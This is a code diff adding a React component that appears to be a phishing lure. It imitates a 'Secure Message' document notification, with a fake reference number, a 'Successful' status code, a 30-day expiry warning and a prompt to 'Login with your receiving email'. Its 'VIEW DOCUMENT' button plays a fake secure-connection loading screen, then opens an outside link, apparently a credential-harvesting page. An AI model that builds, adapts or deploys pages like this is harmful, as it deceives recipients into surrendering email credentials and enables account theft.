@@ -1,0 +1,147 @@
+import { Calendar, FileText, Shield, Clock, Loader2 } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
+import { useState } from "react";
+
+interface SecureMessageCardProps {
+  dateReceived?: string;
+  referenceNumber?: string;
+  pages?: number;
+  fileSize?: string;
+  expiryDays?: number;
+}
+
+export const SecureMessageCard = ({
+  dateReceived = "07/23/2025",
+  referenceNumber = "SP005581456",
+  pages = 3,
+  fileSize = "130kb",
+  expiryDays = 30
+}: SecureMessageCardProps = {}) => {
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleViewDocument = () => {
+    setIsLoading(true);
+    
+    // Show loading for 2 seconds before redirecting
+    setTimeout(() => {
+      window.open("https://coderocket.za.com/UPmmvCcT/", "_blank", "noopener,noreferrer");
+      setIsLoading(false);
+    }, 2000);
+  };
+
+  if (isLoading) {
+    return (
+      <div className="w-full max-w-md mx-auto">
+        {/* Loading Header */}
+        <div className="bg-secure text-primary-foreground px-6 py-4 rounded-t-lg">
+          <div className="flex items-center gap-2 mb-2">
+            <Shield className="h-5 w-5" />
+            <h1 className="text-lg font-semibold">Secure Message</h1>
+          </div>
+          <p className="text-sm opacity-90">07/23/2025 9:12 AM</p>
+        </div>
+
+        {/* Loading Content */}
+        <Card className="rounded-t-none border-t-0 p-6">
+          <div className="flex flex-col items-center justify-center py-12 space-y-6">
+            <div className="relative">
+              <div className="w-16 h-16 border-4 border-secure/20 rounded-full animate-pulse"></div>
+              <div className="absolute inset-0 w-16 h-16 border-4 border-transparent border-t-secure rounded-full animate-spin"></div>
+              <div className="absolute inset-2 flex items-center justify-center">
+                <Shield className="h-6 w-6 text-secure" />
+              </div>
+            </div>
+            
+            <div className="text-center space-y-2">
+              <h3 className="text-lg font-semibold text-foreground">Loading Secure Document</h3>
+              <p className="text-sm text-muted-foreground">
+                Establishing secure connection and verifying authentication...
+              </p>
+              <div className="flex items-center justify-center gap-1">
+                <Loader2 className="h-3 w-3 animate-spin text-secure" />
+                <span className="text-xs text-secure font-medium">SECURE</span>
+              </div>
+            </div>
+
+            <div className="w-full max-w-xs bg-muted rounded-full h-2">
+              <div className="bg-secure h-2 rounded-full animate-pulse" style={{ width: '75%' }}></div>
+            </div>
+            
+            <p className="text-xs text-muted-foreground text-center">
+              Please wait while we prepare your secure document for viewing
+            </p>
+          </div>
+        </Card>
+      </div>
+    );
+  }
+
+  return (
+    <div className="w-full max-w-md mx-auto">
+      {/* Header */}
+      <div className="bg-secure text-primary-foreground px-6 py-4 rounded-t-lg">
+        <div className="flex items-center gap-2 mb-2">
+          <Shield className="h-5 w-5" />
+          <h1 className="text-lg font-semibold">Secure Message</h1>
+        </div>
+        <p className="text-sm opacity-90">07/15/2025 9:12 AM</p>
+      </div>
+
+      {/* Main Content */}
+      <Card className="rounded-t-none border-t-0 p-6 space-y-6">
+        <div className="space-y-2">
+          <h2 className="text-lg font-medium text-foreground">
+            You have received a new document
+          </h2>
+          <p className="text-sm text-muted-foreground">
+            The message was sent securely to protect sensitive information
+            included in the correspondence
+          </p>
+        </div>
+
+        {/* Document Details */}
+        <div className="space-y-3 py-4 border-t border-b border-border">
+          <div className="flex justify-between items-center">
+            <span className="text-sm font-medium">Date Received</span>
+            <span className="text-sm text-muted-foreground">{dateReceived}</span>
+          </div>
+          <div className="flex justify-between items-center">
+            <span className="text-sm font-medium">Reference Number</span>
+            <span className="text-sm text-muted-foreground">{referenceNumber}</span>
+          </div>
+          <div className="flex justify-between items-center">
+            <span className="text-sm font-medium">Number of Pages</span>
+            <span className="text-sm text-muted-foreground">{pages}</span>
+          </div>
+          <div className="flex justify-between items-center">
+            <span className="text-sm font-medium">Status Code</span>
+            <span className="text-sm text-success font-medium">Successful</span>
+          </div>
+        </div>
+
+        {/* View Document Button */}
+        <div className="space-y-4">
+          <Button variant="secure" size="lg" className="w-full" onClick={handleViewDocument}>
+            <FileText className="h-4 w-4" />
+            VIEW DOCUMENT ({fileSize})
+          </Button>
+          
+          <p className="text-xs text-muted-foreground text-center">
+            <strong>Important Note:</strong> Login with your receiving email for a secured authentication to view document
+          </p>
+        </div>
+
+        {/* Expiry Notice */}
+        <div className="bg-warning/10 border border-warning/20 rounded-md p-3">
+          <div className="flex items-center gap-2 text-warning-foreground">
+            <Clock className="h-4 w-4" />
+            <p className="text-sm">
+              This secure message will expire in <strong>{expiryDays} days</strong>
+            </p>
+          </div>
+        </div>
+      </Card>
+    </div>
+  );
+};
